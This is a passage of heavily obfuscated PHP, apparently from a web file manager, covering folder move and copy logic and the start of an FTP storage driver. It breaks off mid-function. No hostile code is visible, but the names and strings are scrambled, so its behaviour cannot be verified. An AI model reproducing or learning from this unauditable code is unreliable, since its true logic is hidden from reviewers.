$Ç¯›ëû² = array_to_keyvalue($ãŒ±”«ï, $ ÖİĞú[183]); $this->_childrenListCache[$ºÊìŸöÊ] = $Ç¯›ëû²; foreach ($Ç¯›ëû² as $ºÊìŸöÊ => $Ü”´Â‰¶) { $this->_childrenItemCache[$ºÊìŸöÊ] = $Ü”´Â‰¶; } return $Ç¯›ëû²; } private function fileNameExistAuto($†Àè±÷”, $âô£ŸÛĞ) { $•şæ¨ø =& $_SERVER[ò«¥Ê‡å]; if ($âô£ŸÛĞ[$•şæ¨ø[475]] == $•şæ¨ø[90]) { return $this->fileNameExist($†Àè±÷”, $âô£ŸÛĞ[$•şæ¨ø[32]]); } return $this->fileNameExistCache($†Àè±÷”, $âô£ŸÛĞ[$•şæ¨ø[32]]); } private function fileNameExistCache($Ÿ“ÍÁƒ, $ä’ë¤Şê) { $‹£–ı¨Ø =& $_SERVER[ò«¥Ê‡å]; $ä’ë¤Şê = strtolower($ä’ë¤Şê); $ë˜÷Ó« = $this->_childrenList($Ÿ“ÍÁƒ); foreach ($ë˜÷Ó« as $åè‡°üÇ) { if ($ä’ë¤Şê == strtolower($åè‡°üÇ[$‹£–ı¨Ø[32]])) { return $åè‡°üÇ[$‹£–ı¨Ø[183]]; } } return !1; } private function fileNameAutoCache($ı¿şÚ«ˆ, $¦ªáÍå£, $…‡Î‚¨, $°íÏ‹Æ˜) { $®äş¼ø‘ =& $_SERVER[ò«¥Ê‡å]; $Öµ­€ œ = $this->_childrenList($ı¿şÚ«ˆ); $©À©Ç = array_to_keyvalue($Öµ­€ œ, $®äş¼ø‘[12], $®äş¼ø‘[32]); return $this->fileNameAutoGet($©À©Ç, $¦ªáÍå£, $…‡Î‚¨, $°íÏ‹Æ˜); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($•İŒšœ‰, $•è®×õ®, $ÊúŠ¤¨Ñ = REPEAT_REPLACE, $ñì‚Ç„Ù = '') { $ø¸‡¼³ =& $_SERVER[ò«¥Ê‡å]; $ÚÔşöÆÚ = $this->sourceInfo($•İŒšœ‰); $ôÛ†œÎÙ = $this->sourceInfo($•è®×õ®); if ($ÚÔşöÆÚ[$ø¸‡¼³[182]] == $ôÛ†œÎÙ[$ø¸‡¼³[183]]) { if ($ÚÔşöÆÚ[$ø¸‡¼³[475]] == $ø¸‡¼³[90]) { Model($ø¸‡¼³[473])->restore(array($•İŒšœ‰)); } if (!$ñì‚Ç„Ù || $ñì‚Ç„Ù == $ÚÔşöÆÚ[$ø¸‡¼³[32]]) { return $•İŒšœ‰; } } $ƒ®·õç = $this->pathInfoMore($•İŒšœ‰); if ($this->isParentOf($•İŒšœ‰, $•è®×õ®)) { return !1; } if (!$ÚÔşöÆÚ || !$ôÛ†œÎÙ || $ôÛ†œÎÙ[$ø¸‡¼³[455]] != $ø¸‡¼³[90]) { return !1; } Hook::trigger($ø¸‡¼³[628], $ƒ®·õç); $this->targetIsDelete = intval($ÚÔşöÆÚ[$ø¸‡¼³[475]]); if ($ÚÔşöÆÚ[$ø¸‡¼³[182]] == $•è®×õ® && $ñì‚Ç„Ù != $ÚÔşöÆÚ[$ø¸‡¼³[32]]) { $©±™÷¹É = $this->fileNameExist($•è®×õ®, $ñì‚Ç„Ù); if ($©±™÷¹É && $ÚÔşöÆÚ[$ø¸‡¼³[455]] == $ø¸‡¼³[214]) { $Ş±•ïÕ = $this->sourceInfo($©±™÷¹É); $“›âşìº = $this->fileHistory($Ş±•ïÕ, $ÚÔşöÆÚ[$ø¸‡¼³[511]], $ÚÔşöÆÚ[$ø¸‡¼³[78]]); if (!$“›âşìº) { Model($ø¸‡¼³[514])->remove($ÚÔşöÆÚ[$ø¸‡¼³[511]]); } $this->removeNow($•İŒšœ‰, !1); $this->folderSizeReset($•è®×õ®); Hook::trigger($ø¸‡¼³[629], $ƒ®·õç); return $©±™÷¹É; } } $äŸÅÓ¹Á = $ñì‚Ç„Ù ? $ñì‚Ç„Ù : $ÚÔşöÆÚ[$ø¸‡¼³[32]]; $this->lockMoveStart($•İŒšœ‰); $this->lockWriteStart($•è®×õ®, $äŸÅÓ¹Á); $Œüşô¼ = array($ø¸‡¼³[599] => array(), $ø¸‡¼³[630] => !1); $this->clearShare($•İŒšœ‰, $•è®×õ®); $Ì—ó¿ŞÈ = $this->fileNameExistAuto($•è®×õ®, $ÚÔşöÆÚ); $²ä“¼ö² = $this->_move($•İŒšœ‰, $•è®×õ®, $ÊúŠ¤¨Ñ, $Œüşô¼, $ñì‚Ç„Ù); $this->sourceCacheClear(); if ($ÚÔşöÆÚ[$ø¸‡¼³[455]] == $ø¸‡¼³[90] && $Ì—ó¿ŞÈ) { $this->folderSizeResetChildren($²ä“¼ö²); } Model($ø¸‡¼³[216])->linkAdd($Œüşô¼[$ø¸‡¼³[599]]); if ($Ì—ó¿ŞÈ && $Œüşô¼[$ø¸‡¼³[630]]) { $this->removeNow($•İŒšœ‰, !1); } $this->lockMoveEnd($•İŒšœ‰); $this->lockWriteEnd($•è®×õ®, $äŸÅÓ¹Á); $this->folderSizeReset($ÚÔşöÆÚ[$ø¸‡¼³[182]]); $this->folderSizeReset($•è®×õ®); $Óç£Ë‘ = array($ÚÔşöÆÚ[$ø¸‡¼³[182]], $•è®×õ®); if ($ÚÔşöÆÚ[$ø¸‡¼³[455]] == $ø¸‡¼³[90]) { $Óç£Ë‘[] = $•İŒšœ‰; } $this->updateModifyTime($Óç£Ë‘); Model($ø¸‡¼³[603])->eventMove($•İŒšœ‰, $ÚÔşöÆÚ[$ø¸‡¼³[182]], $•è®×õ®); Hook::trigger($ø¸‡¼³[629], $ƒ®·õç); return $²ä“¼ö²; } private function _move($˜˜¢İ‚›, $’‹—³, $ø½õ¾óÓ, &$™É†Õáù, $ø¡ïÚĞò = '') { $“ñÊª£ =& $_SERVER[ò«¥Ê‡å]; $Í›Ñî£é = $this->sourceInfo($˜˜¢İ‚›); $€Ê–ÕÎê = $Í›Ñî£é[$“ñÊª£[455]] == $“ñÊª£[90]; $¡Á™û™¼ = $ø¡ïÚĞò ? $ø¡ïÚĞò : $Í›Ñî£é[$“ñÊª£[32]]; $„ÍÈ‡ä‚ = $this->fileNameExistAuto($’‹—³, $Í›Ñî£é); $this->lockMoveStart($˜˜¢İ‚›); $this->lockWriteStart($’‹—³, $¡Á™û™¼); if (!$„ÍÈ‡ä‚) { return $this->_moveForce($˜˜¢İ‚›, $’‹—³, $¡Á™û™¼); } $¤º“¥ÊË = $„ÍÈ‡ä‚; $Ø½ù¹ï„ = !1; if ($€Ê–ÕÎê) { if ($ø½õ¾óÓ == REPEAT_RENAME_FOLDER) { $¡Á™û™¼ = $this->fileNameAuto($’‹—³, $¡Á™û™¼, $ø½õ¾óÓ, $€Ê–ÕÎê); $¤º“¥ÊË = $this->_moveForce($˜˜¢İ‚›, $’‹—³, $¡Á™û™¼); } else { if ($ø½õ¾óÓ == REPEAT_RENAME_FOLDER) { $ø½õ¾óÓ = REPEAT_RENAME; } $ß–ïµ¹ = $this->_childrenListSelect($˜˜¢İ‚›); foreach ($ß–ïµ¹ as $ÏˆÌë‚) { $this->_move($ÏˆÌë‚[$“ñÊª£[183]], $„ÍÈ‡ä‚, $ø½õ¾óÓ, $™É†Õáù); } $Ø½ù¹ï„ = !0; } } else { if ($ø½õ¾óÓ == REPEAT_SKIP) { $Ø½ù¹ï„ = !0; } else { if ($ø½õ¾óÓ == REPEAT_RENAME || $ø½õ¾óÓ == REPEAT_RENAME_FOLDER) { $¡Á™û™¼ = $this->fileNameAuto($’‹—³, $¡Á™û™¼, $ø½õ¾óÓ, $€Ê–ÕÎê); $¤º“¥ÊË = $this->_moveForce($˜˜¢İ‚›, $’‹—³, $¡Á™û™¼); } else { if ($ø½õ¾óÓ == REPEAT_REPLACE) { $Ô˜ì„Œ­ = $this->sourceInfoCache($„ÍÈ‡ä‚); $¯”Õ±ë­ = $this->fileHistory($Ô˜ì„Œ­, $Í›Ñî£é[$“ñÊª£[511]], $Í›Ñî£é[$“ñÊª£[78]]); $Ø½ù¹ï„ = !0; if ($¯”Õ±ë­) { $™É†Õáù[$“ñÊª£[599]][] = $Í›Ñî£é[$“ñÊª£[511]]; } } } } } if ($Ø½ù¹ï„ && !$™É†Õáù[$“ñÊª£[630]]) { $™É†Õáù[$“ñÊª£[630]] = !0; } return $¤º“¥ÊË; } private function _moveForce($×™±Ò­Œ, $Ù¹üÎ, $‡ïİß±ï) { $æÄ£«Ÿ =& $_SERVER[ò«¥Ê‡å]; $±…ùÜû“ = $this->sourceInfo($×™±Ò­Œ); $™æÅŒîš = $this->sourceInfo($Ù¹üÎ); $–ÁÛ»Æ = $±…ùÜû“[$æÄ£«Ÿ[455]] == $æÄ£«Ÿ[90]; $Š÷¹Ç°‘ = array($æÄ£«Ÿ[447] => $™æÅŒîš[$æÄ£«Ÿ[183]], $æÄ£«Ÿ[622] => $™æÅŒîš[$æÄ£«Ÿ[555]] . $™æÅŒîš[$æÄ£«Ÿ[183]] . $æÄ£«Ÿ[50], $æÄ£«Ÿ[618] => $™æÅŒîš[$æÄ£«Ÿ[180]], $æÄ£«Ÿ[619] => $™æÅŒîš[$æÄ£«Ÿ[540]], $æÄ£«Ÿ[621] => USER_ID, $æÄ£«Ÿ[464] => $‡ïİß±ï); $Ê…šá¤² = $±…ùÜû“[$æÄ£«Ÿ[180]] == SourceModel::TYPE_GROUP && $™æÅŒîš[$æÄ£«Ÿ[180]] == SourceModel::TYPE_GROUP && $±…ùÜû“[$æÄ£«Ÿ[540]] == $™æÅŒîš[$æÄ£«Ÿ[540]]; if (!$Ê…šá¤² && $this->moveClearAuth) { Model($æÄ£«Ÿ[538])->authClear($×™±Ò­Œ); } $®‘éÀ» = $±…ùÜû“[$æÄ£«Ÿ[475]] == $æÄ£«Ÿ[90] && $™æÅŒîš[$æÄ£«Ÿ[475]] != $æÄ£«Ÿ[90]; if ($®‘éÀ») { $Š÷¹Ç°‘[$æÄ£«Ÿ[474]] = 0; } if ($–ÁÛ»Æ) { $·“„ºöñ = array($æÄ£«Ÿ[622] => array($æÄ£«Ÿ[582], $±…ùÜû“[$æÄ£«Ÿ[555]] . $±…ùÜû“[$æÄ£«Ÿ[183]] . $æÄ£«Ÿ[583])); $ó®Ù¸ü‰ = $±…ùÜû“[$æÄ£«Ÿ[555]] . $±…ùÜû“[$æÄ£«Ÿ[183]] . $æÄ£«Ÿ[50]; $ïåƒê“¡ = $™æÅŒîš[$æÄ£«Ÿ[555]] . $™æÅŒîš[$æÄ£«Ÿ[183]] . $æÄ£«Ÿ[50] . $±…ùÜû“[$æÄ£«Ÿ[183]] . $æÄ£«Ÿ[50]; $„òíÆÊ§ = array($æÄ£«Ÿ[622] => array($æÄ£«Ÿ[631], "\162\x65\x70\x6c\x61\143\145\x28\160\141\162\145\x6e\164\114\x65\166\145\x6c\x2c\x27{$ó®Ù¸ü‰}\47\x2c\x27{$ïåƒê“¡}\47\51"), $æÄ£«Ÿ[618] => $™æÅŒîš[$æÄ£«Ÿ[180]], $æÄ£«Ÿ[619] => $™æÅŒîš[$æÄ£«Ÿ[540]]); if ($®‘éÀ») { $„òíÆÊ§[$æÄ£«Ÿ[474]] = 0; } $this->where($·“„ºöñ)->data($„òíÆÊ§)->save(); } $this->where(array($æÄ£«Ÿ[461] => $×™±Ò­Œ))->data($Š÷¹Ç°‘)->save(); return $×™±Ò­Œ; } private function clearShare($‹à¥ã“™, $¸Ò¹Ñ¨·) { $šÑ‰Ï©¶ =& $_SERVER[ò«¥Ê‡å]; $Š¬ÅÚûµ = $this->sourceInfo($‹à¥ã“™); $î¯™ÃŸÆ = $this->sourceInfo($¸Ò¹Ñ¨·); if ($Š¬ÅÚûµ[$šÑ‰Ï©¶[540]] == $î¯™ÃŸÆ[$šÑ‰Ï©¶[540]] && $Š¬ÅÚûµ[$šÑ‰Ï©¶[180]] == $šÑ‰Ï©¶[632]) { return; } $è‡ÏË—í = array($šÑ‰Ï©¶[555] => array($šÑ‰Ï©¶[582], $Š¬ÅÚûµ[$šÑ‰Ï©¶[555]] . $‹à¥ã“™ . $šÑ‰Ï©¶[583])); $îë˜ÍÜ = $this->field($šÑ‰Ï©¶[461])->where($è‡ÏË—í)->getField($šÑ‰Ï©¶[183], !0); if (!$îë˜ÍÜ) { return; } $è‡ÏË—í = array($šÑ‰Ï©¶[183] => array($šÑ‰Ï©¶[7], $îë˜ÍÜ), $šÑ‰Ï©¶[633] => 1); $ »Ö‹ú” = Model($šÑ‰Ï©¶[634])->field($šÑ‰Ï©¶[635])->where($è‡ÏË—í)->select(); if (!$ »Ö‹ú”) { return; } $ »Ö‹ú” = array_to_keyvalue($ »Ö‹ú”, $šÑ‰Ï©¶[12], $šÑ‰Ï©¶[635]); $è‡ÏË—í = array($šÑ‰Ï©¶[635] => array($šÑ‰Ï©¶[7], $ »Ö‹ú”)); Model($šÑ‰Ï©¶[634])->where($è‡ÏË—í)->save(array($šÑ‰Ï©¶[633] => 0)); Model($šÑ‰Ï©¶[636])->where($è‡ÏË—í)->delete(); } public function copyFolderFromIO($‘ñ³»ãÃ, $Äçœ„î±, $ÌóÀ¶„, $°ìä³, $µÕüŒ±€, $Şö˜¸¿µ = false) { $Şı©¶Êı =& $_SERVER[ò«¥Ê‡å]; $ûş•™Ş³ = array($Şı©¶Êı[600] => array(), $Şı©¶Êı[601] => array(), $Şı©¶Êı[599] => array(), $Şı©¶Êı[637] => array()); $Ì§‡Ş’Ÿ = $Şö˜¸¿µ ? $Şö˜¸¿µ : $‘ñ³»ãÃ->pathThis($Äçœ„î±); $²‘©Ş•£ = $this->fileNameExist($ÌóÀ¶„, $Ì§‡Ş’Ÿ); $¬§şê¥† = $this->mkdir($ÌóÀ¶„, $Ì§‡Ş’Ÿ, $°ìä³); if (!$²‘©Ş•£ || $°ìä³ == REPEAT_RENAME_FOLDER) { $°ìä³ = !1; } if ($²‘©Ş•£) { $this->_childrenAllMake($²‘©Ş•£); } Hook::trigger($Şı©¶Êı[638]); $this->_copyChildTo($‘ñ³»ãÃ, $Äçœ„î±, $¬§şê¥†, $°ìä³, $ûş•™Ş³, $µÕüŒ±€); Hook::trigger($Şı©¶Êı[639]); if ($¬§şê¥†) { $this->folderSizeResetChildren($¬§şê¥†); } $this->_childrenListClear(); Model($Şı©¶Êı[602])->addAll($ûş•™Ş³[$Şı©¶Êı[600]], array(), !0); Model($Şı©¶Êı[603])->eventCopy($¬§şê¥†); $this->saveAll($ûş•™Ş³[$Şı©¶Êı[601]]); Model($Şı©¶Êı[514])->linkAdd($ûş•™Ş³[$Şı©¶Êı[599]]); Model($Şı©¶Êı[514])->remove($ûş•™Ş³[$Şı©¶Êı[637]]); $this->folderSizeReset($ÌóÀ¶„); $this->updateModifyTime($ÌóÀ¶„); return $¬§şê¥†; } private function _copyChildTo($ş‘•¥˜, $ÃÖ«„, $àÑĞØ»î, $¦Îó¬†É, &$èàŠ£¤, $ì¥È‚´Å) { $ î²¦Ó =& $_SERVER[ò«¥Ê‡å]; $¿è–ÏÓ§ = $this->sourceInfoCache($àÑĞØ»î); $‰Ÿø¾’§ = $ş‘•¥˜->listPath($ÃÖ«„); $‰Ÿø¾’§ = $‰Ÿø¾’§ ? $‰Ÿø¾’§ : array($ î²¦Ó[85] => array(), $ î²¦Ó[84] => array()); $Ã®êäõ = array_merge($‰Ÿø¾’§[$ î²¦Ó[85]], $‰Ÿø¾’§[$ î²¦Ó[84]]); $™­‡¨Â… = $this->_addFiles($ş‘•¥˜, $‰Ÿø¾’§[$ î²¦Ó[85]], $ì¥È‚´Å); $í§Ö¡íÓ = array(); foreach ($Ã®êäõ as &$ÉûıúÉ¸) { if (isset($™­‡¨Â…[$ÉûıúÉ¸[$ î²¦Ó[32]]])) { $ÉûıúÉ¸ = $™­‡¨Â…[$ÉûıúÉ¸[$ î²¦Ó[32]]]; } $ÉûıúÉ¸[$ î²¦Ó[455]] = $ÉûıúÉ¸[$ î²¦Ó[33]] == $ î²¦Ó[77]; $ÉûıúÉ¸[$ î²¦Ó[456]] = substr(_get($ÉûıúÉ¸, $ î²¦Ó[177], $ î²¦Ó[12]), 0, 10); $ÉûıúÉ¸[$ î²¦Ó[78]] = _get($ÉûıúÉ¸, $ î²¦Ó[78], 0); $ÉûıúÉ¸[$ î²¦Ó[511]] = _get($ÉûıúÉ¸, $ î²¦Ó[511], 0); if (!isset($ÉûıúÉ¸[$ î²¦Ó[640]]) && $ÉûıúÉ¸[$ î²¦Ó[511]]) { $èàŠ£¤[$ î²¦Ó[637]][] = $ÉûıúÉ¸[$ î²¦Ó[511]]; } if ($¦Îó¬†É) { $êô¸Ï™š = $this->fileNameExistCache($àÑĞØ»î, $ÉûıúÉ¸[$ î²¦Ó[32]]); if ($êô¸Ï™š) { if ($ÉûıúÉ¸[$ î²¦Ó[455]] || $¦Îó¬†É == REPEAT_SKIP) { continue; } if ($¦Îó¬†É == REPEAT_REPLACE) { $ÓÌ£Š€º = $this->sourceInfoCache($êô¸Ï™š); $ğè—åìÇ = $this->fileHistory($ÓÌ£Š€º, $ÉûıúÉ¸[$ î²¦Ó[511]], $ÉûıúÉ¸[$ î²¦Ó[78]]); if ($ğè—åìÇ) { $èàŠ£¤[$ î²¦Ó[599]][] = $ÉûıúÉ¸[$ î²¦Ó[511]]; } continue; } else { if ($¦Îó¬†É == REPEAT_RENAME) { $ÉûıúÉ¸[$ î²¦Ó[32]] = $this->fileNameAutoCache($àÑĞØ»î, $ÉûıúÉ¸[$ î²¦Ó[32]], $¦Îó¬†É, !1); } } } } if (!$ÉûıúÉ¸[$ î²¦Ó[455]] && $ÉûıúÉ¸[$ î²¦Ó[511]] == 0) { continue; } if (!$ÉûıúÉ¸[$ î²¦Ó[455]] && $ÉûıúÉ¸[$ î²¦Ó[511]]) { $èàŠ£¤[$ î²¦Ó[599]][] = $ÉûıúÉ¸[$ î²¦Ó[511]]; } $í§Ö¡íÓ[] = $this->_makeItemData($ÉûıúÉ¸, $¿è–ÏÓ§, $ÉûıúÉ¸[$ î²¦Ó[32]]); } unset($ÉûıúÉ¸); if (!empty($í§Ö¡íÓ)) { $this->addAll($í§Ö¡íÓ); $this->_childrenListSelect($àÑĞØ»î); } $†ÇèÆ = $this->_childrenList($àÑĞØ»î); $†ÇèÆ = array_to_keyvalue($†ÇèÆ, $ î²¦Ó[32]); foreach ($Ã®êäõ as $ÉûıúÉ¸) { $ÓÌ£Š€º = $†ÇèÆ[$ÉûıúÉ¸[$ î²¦Ó[32]]]; $ÓœÊ÷è = $ÓÌ£Š€º[$ î²¦Ó[183]]; $this->_copyApplyMeta($ÓÌ£Š€º, $èàŠ£¤); if ($ÉûıúÉ¸[$ î²¦Ó[33]] == $ î²¦Ó[77]) { $ÉûıúÉ¸[$ î²¦Ó[86]] = $ş‘•¥˜->getPathInner($ÉûıúÉ¸[$ î²¦Ó[86]]); $this->_copyChildTo($ş‘•¥˜, $ÉûıúÉ¸[$ î²¦Ó[86]], $ÓœÊ÷è, $¦Îó¬†É, $èàŠ£¤, $ì¥È‚´Å); } } } private function _addFiles($İºŞ³æá, $¯ê«¨Í‚, $˜ß…°ˆÆ) { $‡ÙòŒ›Ş =& $_SERVER[ò«¥Ê‡å]; if (!$¯ê«¨Í‚ || count($¯ê«¨Í‚) == 0) { return array(); } $ñêÓÁ¨â = array(); foreach ($¯ê«¨Í‚ as &$ô­ÊÆŸğ) { Hook::trigger($‡ÙòŒ›Ş[641], $ô­ÊÆŸğ); $ô­ÊÆŸğ[$‡ÙòŒ›Ş[86]] = $İºŞ³æá->getPathInner($ô­ÊÆŸğ[$‡ÙòŒ›Ş[86]]); $ó˜©›Êø = $İºŞ³æá->hashSimple($ô­ÊÆŸğ[$‡ÙòŒ›Ş[86]]); $‚ì«¿“£ = $İºŞ³æá->hashMd5($ô­ÊÆŸğ[$‡ÙòŒ›Ş[86]]); if (strlen($‚ì«¿“£) > 10 && !isset($ñêÓÁ¨â[$‚ì«¿“£])) { $ñêÓÁ¨â[$‚ì«¿“£] = array(); } $ô­ÊÆŸğ[$‡ÙòŒ›Ş[642]] = $ó˜©›Êø; $ô­ÊÆŸğ[$‡ÙòŒ›Ş[517]] = $‚ì«¿“£; $ñêÓÁ¨â[$‚ì«¿“£][] =& $ô­ÊÆŸğ; if (count($ñêÓÁ¨â[$‚ì«¿“£]) > 1) { $ô­ÊÆŸğ[$‡ÙòŒ›Ş[640]] = !0; } Hook::trigger($‡ÙòŒ›Ş[643], $ô­ÊÆŸğ); } unset($ô­ÊÆŸğ); $Ñ÷ØÆ‹º = array($‡ÙòŒ›Ş[517] => array($‡ÙòŒ›Ş[7], array_keys($ñêÓÁ¨â))); $ÉÜúÁ¼û = Model($‡ÙòŒ›Ş[644]); $…±øŠÛÔ = $ÉÜúÁ¼û->where($Ñ÷ØÆ‹º)->select(); $…±øŠÛÔ = $…±øŠÛÔ ? $…±øŠÛÔ : array(); foreach ($…±øŠÛÔ as $·İ„Çò) { if (!isset($ñêÓÁ¨â[$·İ„Çò[$‡ÙòŒ›Ş[517]]])) { continue; } $Ûöï“ôö = $ñêÓÁ¨â[$·İ„Çò[$‡ÙòŒ›Ş[517]]]; foreach ($Ûöï“ôö as &$ô­ÊÆŸğ) { $ô­ÊÆŸğ[$‡ÙòŒ›Ş[511]] = $·İ„Çò[$‡ÙòŒ›Ş[511]]; $ô­ÊÆŸğ[$‡ÙòŒ›Ş[640]] = !0; } unset($ô­ÊÆŸğ); } $ŞË‡–· = array(); foreach ($¯ê«¨Í‚ as $éš“ğ’Õ) { Hook::trigger($‡ÙòŒ›Ş[645], $éš“ğ’Õ); if (isset($éš“ğ’Õ[$‡ÙòŒ›Ş[640]]) && $éš“ğ’Õ[$‡ÙòŒ›Ş[640]]) { Hook::trigger($‡ÙòŒ›Ş[646], $éš“ğ’Õ); continue; } $ã×ÙšÁ = $İºŞ³æá->getPathInner($éš“ğ’Õ[$‡ÙòŒ›Ş[86]]); $çÛ°‘† = $ÉÜúÁ¼û->addFileMake($ã×ÙšÁ, $éš“ğ’Õ[$‡ÙòŒ›Ş[78]], $éš“ğ’Õ[$‡ÙòŒ›Ş[642]], $éš“ğ’Õ[$‡ÙòŒ›Ş[517]], $éš“ğ’Õ[$‡ÙòŒ›Ş[32]], $˜ß…°ˆÆ); Hook::trigger($‡ÙòŒ›Ş[646], $éš“ğ’Õ); if (!is_array($çÛ°‘†)) { continue; } $ŞË‡–·[] = $çÛ°‘†; } $ÉÜúÁ¼û->addAll($ŞË‡–·); $Ñ÷ØÆ‹º = array($‡ÙòŒ›Ş[517] => array($‡ÙòŒ›Ş[7], array_keys($ñêÓÁ¨â))); $…±øŠÛÔ = $ÉÜúÁ¼û->where($Ñ÷ØÆ‹º)->select(); $…±øŠÛÔ = $…±øŠÛÔ ? $…±øŠÛÔ : array(); foreach ($…±øŠÛÔ as $·İ„Çò) { if (!isset($ñêÓÁ¨â[$·İ„Çò[$‡ÙòŒ›Ş[517]]])) { continue; } $ÌÑ«äÑ¨ =& $ñêÓÁ¨â[$·İ„Çò[$‡ÙòŒ›Ş[517]]]; foreach ($ÌÑ«äÑ¨ as &$ô­ÊÆŸğ) { $ô­ÊÆŸğ[$‡ÙòŒ›Ş[511]] = $·İ„Çò[$‡ÙòŒ›Ş[511]]; } unset($ô­ÊÆŸğ); } $şãı“«ò = array(); foreach ($¯ê«¨Í‚ as $œ‰‰¨”À) { $şãı“«ò[$œ‰‰¨”À[$‡ÙòŒ›Ş[32]]] = $œ‰‰¨”À; } return $şãı“«ò; } } goto Cö©³ÉÊŒ‘; aÎğòÖ™¦: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($šÂ‚§®«) { parent::__construct(); if (count($šÂ‚§®«) > 0) { $this->_init($šÂ‚§®«); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÍØƒÑ‘) { $†×éÖµ =& $_SERVER[ò«¥Ê‡å]; global $config; $this->appCharset = $config[$†×éÖµ[1398]]; $this->systemCharset = $config[$†×éÖµ[1399]]; if (isset($ÍØƒÑ‘[$†×éÖµ[1400]]) && $ÍØƒÑ‘[$†×éÖµ[1400]]) { $this->systemCharset = $ÍØƒÑ‘[$†×éÖµ[1400]]; } } public function iconvApp($µ•³˜àú) { return $this->iconvTo($µ•³˜àú, $this->systemCharset, $this->appCharset); } public function iconvSystem($ºş’Ÿä®) { return $this->iconvTo($ºş’Ÿä®, $this->appCharset, $this->systemCharset); } public function getPathOuter($ó×ˆ©„’) { $äÛ’£†ç =& $_SERVER[ò«¥Ê‡å]; $êğÎ•Ì£ = $this->iconvApp($this->pathBase); $ó×ˆ©„’ = $this->iconvApp($ó×ˆ©„’); if (substr($êğÎ•Ì£, 0, 2) == $äÛ’£†ç[1401]) { $êğÎ•Ì£ = BASIC_PATH . substr($êğÎ•Ì£, 2); } if (substr($ó×ˆ©„’, 0, 2) == $äÛ’£†ç[1401]) { $ó×ˆ©„’ = BASIC_PATH . substr($ó×ˆ©„’, 2); } $êğÎ•Ì£ = KodIO::clear($êğÎ•Ì£); $ó×ˆ©„’ = KodIO::clear($ó×ˆ©„’); $ó×ˆ©„’ = substr($ó×ˆ©„’, strlen($êğÎ•Ì£)); if (empty($this->pathDriver)) { return $ó×ˆ©„’; } return $this->pathDriver . $äÛ’£†ç[8] . ltrim($ó×ˆ©„’, $äÛ’£†ç[8]); } private function _init($¾áˆ×èÄ = array()) { $‹Ö¶¦¦Í =& $_SERVER[ò«¥Ê‡å]; if (!function_exists($‹Ö¶¦¦Í[1402])) { throw new Exception(LNG($‹Ö¶¦¦Í[1403])); } $this->config = $¾áˆ×èÄ; $this->charsetReset($¾áˆ×èÄ); foreach ($¾áˆ×èÄ as $»Şí—ä¡ => $âğ Î¸§) { if (isset($this->{$»Şí—ä¡})) { $this->{$»Şí—ä¡} = $âğ Î¸§; } } return $this->_login($¾áˆ×èÄ); } private function _login($£è± Ê) { $Œ¼ßàá =& $_SERVER[ò«¥Ê‡å]; static $ª…öÒ¹ş = array(); $İ¢“’¤ß = md5(json_encode($£è± Ê)); if (isset($ª…öÒ¹ş[$İ¢“’¤ß])) { foreach ($ª…öÒ¹ş[$İ¢“’¤ß] as $õÖŒÂ§ => $ÒÍÂˆ¥) { $this->{$õÖŒÂ§} = $ÒÍÂˆ¥; } return !0; } $ôÚ‡«¾ = parse_url(trim($this->server, $Œ¼ßàá[8])); $this->host = $ôÚ‡«¾[$Œ¼ßàá[198]]; $‹†«úğ = isset($ôÚ‡«¾[$Œ¼ßàá[197]]) && $ôÚ‡«¾[$Œ¼ßàá[197]] == $Œ¼ßàá[1404] ? !0 : !1; $this->scheme = $‹†«úğ ? $Œ¼ßàá[1405] : $Œ¼ßàá[1406]; $this->port = isset($ôÚ‡«¾[$Œ¼ßàá[199]]) ? $ôÚ‡«¾[$Œ¼ßàá[199]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $…ŒÜİÅ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ãßÊıÈ = $this->pasv == $Œ¼ßàá[90] ? !0 : !1; @ftp_pasv($this->connect, $ãßÊıÈ); $ª…öÒ¹ş[$İ¢“’¤ß] = array($Œ¼ßàá[1407] => $this->connect, $Œ¼ßàá[198] => $this->host, $Œ¼ßàá[197] => $this->scheme, $Œ¼ßàá[199] => $this->port); return $…ŒÜİÅ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ä¾à¯¬Ò, $Ò¦æ¥€÷ = '', $Æ£È¿™ş = REPEAT_RENAME) { if ($this->setContent($ä¾à¯¬Ò, $Ò¦æ¥€÷)) { return $this->getPathOuter($ä¾à¯¬Ò); } return !1; } public function mkdir($©õ³Ë¬ğ, $ß€ù×Ü¹ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $©õ³Ë¬ğ = $this->iconvSystem($©õ³Ë¬ğ); if ($this->_isFolder($©õ³Ë¬ğ) || @ftp_mkdir($this->connect, $©õ³Ë¬ğ)) { return $this->getPathOuter($©õ³Ë¬ğ); } if (!$this->mkdir($this->pathFather($©õ³Ë¬ğ))) { return !1; } if ($©õ³Ë¬ğ = @ftp_mkdir($this->connect, $©õ³Ë¬ğ)) { return $this->getPathOuter($©õ³Ë¬ğ); } return !1; } public function copyFile($ñ¿›Èåş, $é›Áô ’) { if (!$this->_isconn()) { return !1; } $áªòªõë = $this->pathThis($this->iconvSystem($ñ¿›Èåş)); $Ø˜‹’û = $this->tempFile($áªòªõë); $°²òÒ = $this->iconvApp($Ø˜‹’û); $this->download($ñ¿›Èåş, $°²òÒ); $ÆŠŒÑŒÎ = $this->upload($é›Áô ’, $°²òÒ); $this->tempFileRemve($Ø˜‹’û); return $ÆŠŒÑŒÎ; } public function moveFile($ÒÔŠ·º, $çâ™¿ú¢) { if (!$this->_isconn()) { return !1; } $ÒÔŠ·º = $this->iconvSystem($ÒÔŠ·º); $çâ™¿ú¢ = $this->iconvSystem($çâ™¿ú¢); $²œì°Ğï = @ftp_rename($this->connect, $ÒÔŠ·º, $çâ™¿ú¢); return $²œì°Ğï ? $this->getPathOuter($çâ™¿ú¢) : !1; } public function delFile($ŠÊÊ¨šª) { if (!$this->_isconn()) { return !1; } $ŠÊÊ¨šª = $this->iconvSystem($ŠÊÊ¨šª); return @ftp_delete($this->connect, $ŠÊÊ¨šª); } public function delFolder($ªà¼ˆÖÙ) { if 